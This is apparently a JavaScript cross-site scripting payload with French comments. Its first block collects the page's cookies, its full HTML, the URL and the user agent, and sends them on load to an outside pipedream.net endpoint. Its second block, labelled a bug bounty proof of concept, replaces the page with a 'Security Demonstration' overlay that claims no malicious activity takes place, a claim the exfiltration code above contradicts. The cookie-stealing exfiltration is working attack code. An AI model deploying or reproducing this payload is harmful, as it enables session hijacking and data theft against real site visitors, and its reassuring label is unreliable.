// Fonction pour récupérer les cookies
function grabCookies() {
    return document.cookie;
}

// Fonction pour récupérer tout le HTML de la page
function grabFullHTML() {
    return document.documentElement.outerHTML;
}

// Fonction pour envoyer les données au serveur
function sendDataToServer() {
    const cookies = grabCookies();
    const html = grabFullHTML();
    
    // Créer l'objet de données à envoyer
    const data = {
        cookies: cookies,
        html: html,
        url: window.location.href,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    };
    
    // Envoyer les données via une requête POST
    fetch('https://eoppt5zj3no3twu.m.pipedream.net', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    }).catch(error => {
        console.error('Erreur lors de l\'envoi des données:', error);
    });
}

// Exécuter la fonction d'envoi
sendDataToServer();

// XSS Demonstration Professionnelle - Bug Bounty Proof of Concept
(function() {
    // Sauvegarder le contenu original
    const originalContent = document.documentElement.innerHTML;
    const pageTitle = document.title;
    
    // Créer l'interface professionnelle
    document.documentElement.innerHTML = `
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Demonstration - XSS Proof of Concept</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .security-demo {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 40px;
            max-width: 800px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .demo-header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .demo-title {
            font-size: 2.5em;
            color: #2c3e50;
            margin-bottom: 10px;
            font-weight: 300;
        }
        
        .demo-subtitle {
            color: #7f8c8d;
            font-size: 1.1em;
        }
        
        .demo-content {
            display: grid;
            gap: 25px;
            margin-bottom: 30px;
        }
        
        .info-card {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 12px;
            border-left: 4px solid #3498db;
        }
        
        .info-card.warning {
            border-left-color: #e74c3c;
        }
        
        .info-card.success {
            border-left-color: #2ecc71;
        }
        
        .card-title {
            font-weight: 600;
            color: #2c3e50;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .card-content {
            color: #5a6c7d;
            line-height: 1.6;
        }
        
        .interactive-section {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 12px;
            text-align: center;
        }
        
        .demo-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
            margin-top: 20px;
        }
        
        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-primary {
            background: #3498db;
            color: white;
        }
        
        .btn-primary:hover {
            background: #2980b9;
            transform: translateY(-2px);
        }
        
        .btn-secondary {
            background: #95a5a6;
            color: white;
        }
        
        .btn-secondary:hover {
            background: #7f8c8d;
        }
        
        .btn-warning {
            background: #e74c3c;
            color: white;
        }
        
        .btn-warning:hover {
            background: #c0392b;
        }
        
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }
        
        .status-active {
            background: #2ecc71;
            animation: pulse 2s infinite;
        }
        
        .log-container {
            background: #2c3e50;
            color: #ecf0f1;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            max-height: 200px;
            overflow-y: auto;
            margin-top: 20px;
            text-align: left;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .timestamp {
            color: #3498db;
        }
        
        .event-log {
            margin: 5px 0;
        }
    </style>
</head>
<body>
    <div class="security-demo">
        <div class="demo-header">
            <h1 class="demo-title">🔒 Security Demonstration</h1>
            <p class="demo-subtitle">Cross-Site Scripting (XSS) Proof of Concept</p>
        </div>
        
        <div class="demo-content">
            <div class="info-card">
                <div class="card-title">
                    <span class="status-indicator status-active"></span>
                    Vulnerability Status: ACTIVE
                </div>
                <div class="card-content">
                    This page demonstrates a critical XSS vulnerability. The content has been replaced to show the potential impact of arbitrary JavaScript execution.
                </div>
            </div>
            
            <div class="info-card warning">
                <div class="card-title">⚠️ Security Impact</div>
                <div class="card-content">
                    <strong>Risk Level:</strong> Critical<br>
                    <strong>Affected:</strong> Client-side security<br>
                    <strong>Potential Damage:</strong> Data theft, session hijacking, defacement
                </div>
            </div>
            
            <div class="info-card success">
                <div class="card-title">✅ Demonstration Purpose</div>
                <div class="card-content">
                    This is a controlled security demonstration for bug bounty reporting. No malicious activities are performed.
                </div>
            </div>
        </div>
        
        <div class="interactive-section">
            <h3 style="margin-bottom: 20px; color: #2c3e50;">Interactive Demonstration</h3>
            
            <div class="demo-buttons">
                <button class="btn btn-primary" onclick="showPageInfo()">
                    📊 Show Page Information
                </button>
                <button class="btn btn-secondary" onclick="simulateDataCapture()">
                    🔍 Simulate Data Exposure
                </button>
                <button class="btn btn-warning" onclick="restoreOriginal()">
                    ↩️ Restore Original Page
                </button>
            </div>
            
            <div id="logContainer" class="log-container" style="display: none;">
                <div id="eventLogs"></div>
            </div>
        </div>
    </div>

    <script>
        let eventCount = 0;
        
        function logEvent(message) {
            eventCount++;
            const logContainer = document.getElementById('logContainer');
            const eventLogs = document.getElementById('eventLogs');
            
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = document.createElement('div');
            logEntry.className = 'event-log';
            logEntry.innerHTML = \`<span class="timestamp">[\${timestamp}]</span> \${message}\`;
            
            eventLogs.appendChild(logEntry);
            logContainer.style.display = 'block';
            logContainer.scrollTop = logContainer.scrollHeight;
        }
        
        function showPageInfo() {
            const info = \`
Page URL: \${window.location.href}
User Agent: \${navigator.userAgent}
Cookies: \${document.cookie ? document.cookie.substring(0, 100) + '...' : 'None'}
Platform: \${navigator.platform}
            \`.trim();
            
            logEvent('Page information retrieved');
            alert('Page Information:\\n\\n' + info);
        }
        
        function simulateDataCapture() {
            logEvent('Simulating sensitive data capture');
            
            // Simulation d'extraction de données
            const simulatedData = {
                timestamp: new Date().toISOString(),
                currentUrl: window.location.href,
                pageTitle: '${pageTitle}',
                formsCount: 'N/A (demo mode)',
                inputsCount: 'N/A (demo mode)'
            };
            
            logEvent('Data extraction simulation completed');
            alert('Simulated Data Capture:\\n\\n' + JSON.stringify(simulatedData, null, 2));
        }
        
        function restoreOriginal() {
            if (confirm('Restore original page content?')) {
                document.documentElement.innerHTML = originalContent;
                logEvent('Original page content restored');
            }
        }
        
        // Log initial events
        setTimeout(() => {
            logEvent('XSS demonstration initialized');
            logEvent('Security overlay activated');
            logEvent('Ready for interactive demonstration');
        }, 1000);
    </script>
</body>
</html>
    `;
})();
